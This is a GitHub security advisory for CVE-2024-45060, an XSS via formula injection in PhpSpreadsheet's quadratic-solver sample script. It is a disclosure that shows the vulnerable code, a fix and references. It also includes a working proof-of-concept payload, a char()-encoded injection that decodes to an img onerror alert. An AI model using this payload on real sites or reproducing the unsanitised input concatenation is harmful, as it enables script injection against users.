# [M] PhpSpreadsheet has an Unauthenticated Cross-Site-Scripting (XSS) in sample file

## Summary
Severity: Medium
Advisory: GHSA-v66g-p9x6-v98p
CVE: CVE-2024-45060
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2024-10-07
Source: https://github.com/advisories/GHSA-v66g-p9x6-v98p
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.3.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.29.2
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.1
- Packagist: `phpoffice/phpexcel` — affected >=0

## Details
### Summary
One of the sample scripts in PhpSpreadsheet is susceptible to a cross-site scripting (XSS) vulnerability due to improper handling of input where a number is expected leading to formula injection.

### Details

The following [code](https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56) in `45_Quadratic_equation_solver.php` concatenates the user supplied parameters directly into spreadsheet formulas. This allows an attacker to take control over the formula and output unsanitized data into the page, resulting in JavaScript execution.
```
$discriminantFormula = '=POWER(' . $_POST['B'] . ',2) - (4 * ' . $_POST['A'] . ' * ' . $_POST['C'] . ')';
$discriminant = Calculation::getInstance()->calculateFormula($discriminantFormula);

$r1Formula = '=IMDIV(IMSUM(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . ')';
$r2Formula = '=IF(' . $discriminant . '=0,"Only one root",IMDIV(IMSUB(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . '))';
```


### PoC
1. Access `45_Quadratic_equation_solver.php` in a browser
2. Enter any valid values for for `b` and `c`, and enter the following for `a`

```
1) & ("1)),1)&char(60)&char(105)&char(109)&char(103)&char(32)&char(115)&char(114)&char(99)&char(61)&char(120)&char(32)&char(111)&char(110)&char(101)&char(114)&char(114)&char(111)&char(114)&char(61)&char(97)&char(108)&char(101)&char(114)&char(116)&char(40)&char(41)&char(62)&POWER(((1") &n("1")&(1
```

3. Press submit and observe that JavaScript is executed.

![exploit-phpspreadsheet](https://user-images.githubusercontent.com/1211162/297062610-0cdb26d1-2b47-46e2-bd31-189b0694186d.png)

### Impact

The impact of this vulnerability on the project is expected to be relatively low since these are sample files that should not be included when the library is used properly (e.g., through composer). However, at least two instances of popular WordPress plugins have unintentionally exposed this file by including the entire git repository. Since these files also serve as reference points for developers using the library, addressing this issue can enhance security for users.

A solution to fix the vulnerability is proposed below, and a request for a CVE assignment has been made to facilitate responsible disclosure of the security issue to the affected WordPress plugins.

### Remediation

A quick and easy solution to prevent this attack is to force the parameters to be numerical values:

```php
if (isset($_POST['submit'])) {
    $_POST['A'] = floatval($_POST['A']);
    $_POST['B'] = floatval($_POST['B']);
    $_POST['C'] = floatval($_POST['C']);
    if ($_POST['A'] == 0) {
```

Thank you for your time!

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p
- https://nvd.nist.gov/vuln/detail/CVE-2024-45060
- https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007
- https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759
- https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747
- https://github.com/PHPOffice/PhpSpreadsheet
- https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56
